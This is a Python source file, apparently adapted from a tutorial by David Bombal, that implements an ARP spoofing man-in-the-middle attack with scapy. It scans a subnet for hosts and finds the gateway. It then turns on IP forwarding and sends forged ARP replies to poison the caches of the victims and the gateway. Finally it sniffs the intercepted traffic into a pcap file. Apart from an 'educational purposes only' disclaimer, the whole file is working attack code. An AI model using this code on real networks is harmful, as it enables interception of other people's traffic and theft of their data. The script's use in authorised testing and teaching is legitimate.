#!/user/bin python3

# Disclaimer: This script is for educational purposes only.
# Do not use against any network that you don't own or have authorization to test.
# To run this script use:
# sudo python3 arp_spoof.py -ip_range 10.0.0.0/24 (ex. 192.168.1.0/24)

""" ______            _     _  ______                 _           _
    |  _  \          (_)   | | | ___ \               | |         | |
    | | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
    | | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
    | |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
    |___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|"""

"Copyright of David Bombal, 2021"
"https://www.davidbombal.com"
"https://www.youtube.com/davidbombal"

import scapy.all as scapy
import subprocess
import sys
import time
import os
from pathlib import Path
from ipaddress import IPv4Network
import threading


"""this is the script I found on GitHub.
There are few small changes I made so
it would work fine with my GUI. Instead
of terminal I use my GUI (NetworkAttacks
class) to interact with the script, so I 
left only the functions here and some of
them I transferred into my class for better
functionality"""


def arp_scan(ip_range):
    """We use the arping method in scapy. It is a better implementation than writing your own arp scan. You'll often see that your own arp scan doesn't pick up
       mobile devices. You can see the way scapy implemented the function here: https://github.com/secdev/scapy/blob/master/scapy/layers/l2.py#L726-L749
       Arguments: ip_range -> an example would be "10.0.0.0/24"
    """
    # We create an empty list where we will store the pairs of ARP responses.
    arp_responses = list()
    # We send arp packets through the network, verbose is set to 0 so it won't show any output.
    # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
    answered_lst = scapy.arping(ip_range, verbose=0)[0]

    # We loop through all the responses and add them to a dictionary and append them to the list arp_responses.
    for res in answered_lst:
        # Every response will look something lke like -> {"ip" : "10.0.0.4", "mac" : "00:00:00:00:00:00"}
        arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})

    # We return the list of arp responses which contains dictionaries for every arp response.
#    return arp_responses
    return arp_responses


def is_gateway(gateway_ip):
    """We can see the gateway by running the route -n command
       Argument: The gateway_ip address which the program finds automatically should be supplied as an argument.
    """
    # We run the command route -n which returns information about the gateways.
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # Loop through every row in the route -n command.
    for row in result:
        # We look to see if the gateway_ip is in the row, if it is we return True. If False program continues flow and returns False.
        if gateway_ip in row:
            return True

    return False


def get_interface_names():
    """The interface names of a networks are listed in the /sys/class/net folder in Kali. This function returns a list of interfaces in Kali."""
    # The interface names are directory names in the /sys/class/net folder. So we change the directory to go there.
    os.chdir("/sys/class/net")
    # We use the listdir() function from the os module. Since we know there won't be files and only directories with the interface names we can save the output as the interface names.
    interface_names = os.listdir()
    # We return the interface names which we will use to find out which one is the name of the gateway.
    return interface_names


def match_iface_name(row):
    # We get all the interface names by running the function defined above with the
    interface_names = get_interface_names()

    # Check if the interface name is in the row. If it is then we return the iface name.
    for iface in interface_names:
        if iface in row:
            return iface


def gateway_info(network_info):
    """We can see the gateway by running the route -n command. This get us the gateway information. We also need the name of the interface for the sniffer function.
        Arguments: network_info -> We supply the arp_scan() data.
    """
    # We run route -n and capture the output.
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # We declare an empty list for the gateways.
    gateways = []
    # We supplied the arp_scan() results (which is a list) as an argument to the network_info parameter.
    for iface in network_info:
        for row in result:
            # We want the gateway information to be saved to list called gateways. We know the ip of the gateway so we can compare and see in which row it appears.
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                # Once we found the gateway, we create a dictionary with all of its names.
                gateways.append({"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})

    return gateways


def clients(arp_res, gateway_list):
    """This function returns a list with only the clients. The gateway is removed from the list. Generally you did get the ARP response from the gateway at the 0 index
       but I did find that sometimes this may not be the case.
       Arguments: arp_res (The response from the ARP scan), gateway_res (The response from the gatway_info function.)
    """
    # In the menu we only want to give you access to the clients whose arp tables you want to poison. The gateway needs to be removed.
    client_list = []
    for gateway in gateway_list:
        for item in arp_res:
            # All items which are not the gateway will be appended to the client_list.
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
        # return the list with the clients which will be used for the menu.
        return client_list

"""This is the only function that I had to change
in my Kali version the previously setup file didn't
exist so I set up new file just for the purpose of
ip forwarding and changed the function so it first
runs command to allow ip forwarding and if it fails
it reloads the system setting that I set up in the file
I created"""
def allow_ip_forwarding():
    result = subprocess.run(["sysctl", "net.ipv4.ip_forward=1"], capture_output=True, text=True)

    ip_forward_status = result.stdout.split("=")[1].strip()

    if ip_forward_status == "1":
        pass
    else:
        subprocess.run(["sysctl", "--system"], capture_output=True)


def arp_spoofer(target_ip, target_mac, spoof_ip):
    """ To update the ARP tables this function needs to be ran twice. Once with the gateway ip and mac, and then with the ip and mac of the target.
    Arguments: target ip address, target mac, and the spoof ip address.
    """
    # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at" response packet.
    # We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to the target machine, and sending a packet to the router that we are at the target machine's ip.
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = scapy.Ether(dst=target_mac)

    packet = ether / arp
    # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
    scapy.sendp(packet, verbose=False)


def packet_sniffer(stop_event, interface):
    """ This function will be a packet sniffer to capture all the packets sent to the computer whilst this computer is the MITM. """
    # We use the sniff function to sniff the packets going through the gateway interface. We don't store them as it takes a lot of resources. The process_sniffed_pkt is a callback function that will run on each packet.
    packets = scapy.sniff(iface=interface, store=False, prn=process_sniffed_pkt, stop_filter=lambda p:stop_event.is_set())


def process_sniffed_pkt(pkt):
    """ This function is a callback function that works with the packet sniffer. It receives every packet that goes through scapy.sniff(on_specified_interface) and writes it to a pcap file"""
    # We append every packet sniffed to the requests.pcap file which we can inspect with Wireshark.
    scapy.wrpcap("requests.pcap", pkt, append=True)